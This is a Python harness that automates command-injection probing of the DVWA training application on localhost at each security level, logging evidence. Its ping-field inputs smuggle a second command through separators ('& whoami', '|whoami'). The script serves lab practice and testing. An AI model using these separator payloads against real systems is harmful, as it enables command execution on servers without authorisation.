#!/usr/bin/env python3
import argparse
import hashlib
import json
import re
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup


TZ = timezone(timedelta(hours=8))
DIFFICULTIES = ["low", "medium", "high", "impossible"]
MODULE_ROUTE = "vulnerabilities/exec/"
PING_MARKERS = ["TTL=", "Ping statistics", "127.0.0.1"]
INVALID_IP_MARKER = "ERROR: You have entered an invalid IP."


def now_iso():
    return datetime.now(TZ).isoformat(timespec="seconds")


def normalize_text(html):
    soup = BeautifulSoup(html, "html.parser")
    return " ".join(soup.get_text(" ").split())


def pre_text(html):
    soup = BeautifulSoup(html, "html.parser")
    pre = soup.find("pre")
    if not pre:
        return ""
    return pre.get_text("\n")


def extract_token(html):
    soup = BeautifulSoup(html, "html.parser")
    field = soup.find("input", {"name": "user_token"})
    return field.get("value") if field else None


def extract_form(html):
    soup = BeautifulSoup(html, "html.parser")
    form = soup.find("form")
    if not form:
        return {"method": None, "action": None, "fields": []}
    fields = []
    for element in form.find_all(["input", "select"]):
        fields.append(
            {
                "tag": element.name,
                "name": element.get("name"),
                "type": element.get("type"),
                "value": element.get("value"),
            }
        )
    return {
        "method": form.get("method", "GET").upper(),
        "action": form.get("action", "#"),
        "fields": fields,
    }


def marker_context(text, marker):
    index = text.find(marker)
    if index < 0:
        return ""
    start = max(0, index - 80)
    end = min(len(text), index + len(marker) + 160)
    return text[start:end]


def classify(html):
    text = normalize_text(html)
    command_output = pre_text(html)
    markers = []
    contexts = {}
    for marker in PING_MARKERS:
        if marker in text:
            markers.append("ping_output")
            contexts["ping_output"] = marker_context(text, marker)
            break
    if INVALID_IP_MARKER in text:
        markers.append("invalid_ip_error")
        contexts["invalid_ip_error"] = marker_context(text, INVALID_IP_MARKER)
    whoami_candidates = re.findall(r"[A-Za-z0-9_.-]+\\[A-Za-z0-9$_.-]+", command_output)
    if whoami_candidates:
        markers.append("whoami_output")
        contexts["whoami_output"] = whoami_candidates[0]
    if not markers:
        markers.append("no_known_marker")
    return markers, contexts, text, command_output


def safe_name(value):
    return "".join(ch if ch.isalnum() or ch in "-_" else "_" for ch in value)


class Harness:
    def __init__(self, base_url, dvwa_user, dvwa_password, source_path, out_dir, proxy=None):
        self.base_url = base_url if base_url.endswith("/") else base_url + "/"
        self.dvwa_user = dvwa_user
        self.dvwa_password = dvwa_password
        self.source_path = Path(source_path)
        self.out_dir = Path(out_dir)
        self.requests_dir = self.out_dir / "requests"
        self.log_path = self.out_dir / "operation-log.jsonl"
        self.json_path = self.out_dir / "report.json"
        self.session = requests.Session()
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.started = time.perf_counter()
        self.entries = []
        self.results = []
        self.total_requests = 0

    def log(self, difficulty, tool, action, input_summary, output_summary, duration_s=None, evidence_path=None):
        entry = {
            "ts": now_iso(),
            "elapsed_s": round(time.perf_counter() - self.started, 3),
            "difficulty": difficulty,
            "tool": tool,
            "action": action,
            "input_summary": input_summary,
            "output_summary": output_summary,
            "duration_s": round(duration_s, 3) if duration_s is not None else None,
            "evidence_path": evidence_path,
        }
        self.entries.append(entry)
        with self.log_path.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry, ensure_ascii=False) + "\n")

    def request(self, method, route, difficulty, label, **kwargs):
        start = time.perf_counter()
        resp = self.session.request(
            method,
            urljoin(self.base_url, route),
            proxies=self.proxies,
            allow_redirects=True,
            timeout=30,
            **kwargs,
        )
        duration = time.perf_counter() - start
        self.total_requests += 1
        markers, contexts, text, command_output = classify(resp.text)
        fields = kwargs.get("params") or kwargs.get("data") or {}
        evidence = {
            "method": method,
            "url": resp.url,
            "status_code": resp.status_code,
            "elapsed_s": round(duration, 3),
            "request_fields": fields,
            "response_len": len(resp.text),
            "markers": markers,
            "marker_contexts": contexts,
            "pre_text": command_output[:1200],
            "snippet": text[:500],
        }
        path = self.requests_dir / f"{safe_name(difficulty)}-{safe_name(label)}.json"
        path.write_text(json.dumps(evidence, ensure_ascii=False, indent=2), encoding="utf-8")
        self.log(
            difficulty,
            "python-requests",
            label,
            f"{method} {route} fields={list(fields.keys())}",
            f"status={resp.status_code} markers={markers} elapsed={duration:.3f}s",
            duration,
            str(path.relative_to(self.out_dir)),
        )
        return resp, evidence

    def get(self, route, difficulty, label, **kwargs):
        return self.request("GET", route, difficulty, label, **kwargs)

    def post(self, route, difficulty, label, **kwargs):
        return self.request("POST", route, difficulty, label, **kwargs)

    def login(self):
        resp, _ = self.get("login.php", "setup", "fetch-login-form")
        data = {
            "username": self.dvwa_user,
            "password": self.dvwa_password,
            "Login": "Login",
            "user_token": extract_token(resp.text),
        }
        resp, evidence = self.post("login.php", "setup", "submit-dvwa-login", data=data)
        authenticated = "Logout" in resp.text or "Damn Vulnerable Web Application" in resp.text
        self.log("setup", "auth", "login-result", "DVWA credentials supplied by user", f"authenticated={authenticated}")
        if not authenticated:
            raise RuntimeError("DVWA login did not produce an authenticated page")
        return evidence

    def set_security(self, difficulty):
        resp, _ = self.get("security.php", difficulty, "fetch-security-form")
        data = {"security": difficulty, "seclev_submit": "Submit", "user_token": extract_token(resp.text)}
        resp, evidence = self.post("security.php", difficulty, "set-security", data=data)
        cookie_level = self.session.cookies.get("security")
        self.log(difficulty, "dvwa", "security-cookie", f"requested={difficulty}", f"cookie={cookie_level}")
        return evidence

    def inspect_module(self, difficulty):
        resp, evidence = self.get(MODULE_ROUTE, difficulty, "inspect-module-form")
        form = extract_form(resp.text)
        evidence["form"] = form
        evidence["security_cookie"] = self.session.cookies.get("security")
        path = self.requests_dir / f"{difficulty}-inspect-module-form.json"
        path.write_text(json.dumps(evidence, ensure_ascii=False, indent=2), encoding="utf-8")
        self.log(difficulty, "html-parser", "form-model", "first form", json.dumps(form, ensure_ascii=False))
        return form, resp.text

    def source_metadata(self, difficulty):
        source_file = self.source_path / "vulnerabilities" / "exec" / "source" / f"{difficulty}.php"
        data = source_file.read_bytes()
        meta = {
            "path": str(source_file),
            "size_bytes": source_file.stat().st_size,
            "sha256": hashlib.sha256(data).hexdigest(),
            "mtime": datetime.fromtimestamp(source_file.stat().st_mtime, TZ).isoformat(timespec="seconds"),
        }
        self.log(difficulty, "source-review", f"read {difficulty}.php", str(source_file), f"sha256={meta['sha256'][:16]}")
        return meta

    def submit_ip(self, difficulty, ip_value, label, token_required=False):
        data = {"ip": ip_value, "Submit": "Submit"}
        if token_required:
            form_resp, _ = self.get(MODULE_ROUTE, difficulty, f"{label}-fetch-fresh-token")
            data["user_token"] = extract_token(form_resp.text)
        _, evidence = self.post(MODULE_ROUTE, difficulty, label, data=data)
        evidence["ip"] = ip_value
        evidence["token_required"] = token_required
        return evidence

    def level_plan(self, difficulty):
        if difficulty == "low":
            return [
                ("normal-ping-baseline", "127.0.0.1", "baseline"),
                ("invalid-host-baseline", "not_an_ip_20260602", "negative"),
                ("proof-ampersand-whoami", "127.0.0.1 & whoami", "proof"),
            ]
        if difficulty == "medium":
            return [
                ("normal-ping-baseline", "127.0.0.1", "baseline"),
                ("blocked-double-ampersand", "127.0.0.1 && whoami", "blocked_probe"),
                ("proof-single-ampersand-whoami", "127.0.0.1 & whoami", "proof"),
            ]
        if difficulty == "high":
            return [
                ("normal-ping-baseline", "127.0.0.1", "baseline"),
                ("blocked-ampersand", "127.0.0.1 & whoami", "blocked_probe"),
                ("proof-pipe-nospace-whoami", "127.0.0.1|whoami", "proof"),
            ]
        return [
            ("normal-ping-baseline", "127.0.0.1", "baseline"),
            ("invalid-ip-baseline", "not_an_ip_20260602", "negative"),
            ("rejected-ampersand-whoami", "127.0.0.1 & whoami", "defense_probe"),
            ("rejected-pipe-nospace-whoami", "127.0.0.1|whoami", "defense_probe"),
        ]

    def run_level(self, difficulty):
        level_start = time.perf_counter()
        requests_before = self.total_requests
        self.set_security(difficulty)
        form, _ = self.inspect_module(difficulty)
        source_meta = self.source_metadata(difficulty)
        token_required = difficulty == "impossible"
        plan = self.level_plan(difficulty)
        self.log(difficulty, "test-plan", "generated-command-injection-probes", "source-derived harmless probes", json.dumps(plan, ensure_ascii=False))

        attempts = []
        status = "not_run"
        stop_reason = ""
        proof = None
        for label, ip_value, purpose in plan:
            evidence = self.submit_ip(difficulty, ip_value, label, token_required=token_required)
            evidence["purpose"] = purpose
            attempts.append(evidence)
            if purpose == "proof" and "whoami_output" in evidence["markers"]:
                status = "solved_vulnerable"
                proof = evidence["marker_contexts"].get("whoami_output")
                stop_reason = "response contained whoami output from a source-derived separator payload"
                break

        if difficulty == "impossible":
            rejected = [a for a in attempts if a.get("purpose") == "defense_probe" and "invalid_ip_error" in a["markers"] and "whoami_output" not in a["markers"]]
            if len(rejected) == 2:
                status = "defended_not_vulnerable"
                stop_reason = "strict four-octet numeric IP validation rejected separator payloads before shell execution"
            else:
                status = "inconclusive"
                stop_reason = "defense probes did not produce the expected rejection pattern"
        elif status == "not_run":
            status = "inconclusive"
            stop_reason = "small harmless probe set did not produce command-output proof"

        elapsed = time.perf_counter() - level_start
        result = {
            "difficulty": difficulty,
            "status": status,
            "stop_reason": stop_reason,
            "proof": proof,
            "form": form,
            "token_required": token_required,
            "source": source_meta,
            "attempts": attempts,
            "request_count": self.total_requests - requests_before,
            "level_elapsed_s": round(elapsed, 3),
        }
        self.results.append(result)
        self.log(difficulty, "harness", "level-conclusion", difficulty, f"{status}; {stop_reason}", elapsed)
        return result

    def run(self):
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.requests_dir.mkdir(parents=True, exist_ok=True)
        if self.log_path.exists():
            self.log_path.unlink()
        run_started = now_iso()
        self.login()
        stop_after = None
        for difficulty in DIFFICULTIES:
            result = self.run_level(difficulty)
            if result["status"] in ("defended_not_vulnerable", "blocked", "inconclusive"):
                stop_after = difficulty
                break
        run_finished = now_iso()
        payload = {
            "target": self.base_url,
            "module": "Command Injection",
            "run_started": run_started,
            "run_finished": run_finished,
            "elapsed_s": round(time.perf_counter() - self.started, 3),
            "stop_after": stop_after,
            "total_requests": self.total_requests,
            "results": self.results,
            "operation_log": str(self.log_path),
        }
        self.json_path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
        print(json.dumps(payload, ensure_ascii=False, indent=2))


def main():
    parser = argparse.ArgumentParser(description="DVWA Command Injection progression harness generated from live page/source inspection.")
    parser.add_argument("--base-url", default="http://127.0.0.1/dvwa/")
    parser.add_argument("--dvwa-user", default="admin")
    parser.add_argument("--dvwa-password", default="password")
    parser.add_argument("--source-path", default=r"D:\phpStudy\PHPTutorial\WWW\DVWA")
    parser.add_argument("--out-dir", required=True)
    parser.add_argument("--proxy", default=None)
    args = parser.parse_args()
    Harness(args.base_url, args.dvwa_user, args.dvwa_password, args.source_path, args.out_dir, args.proxy).run()


if __name__ == "__main__":
    main()
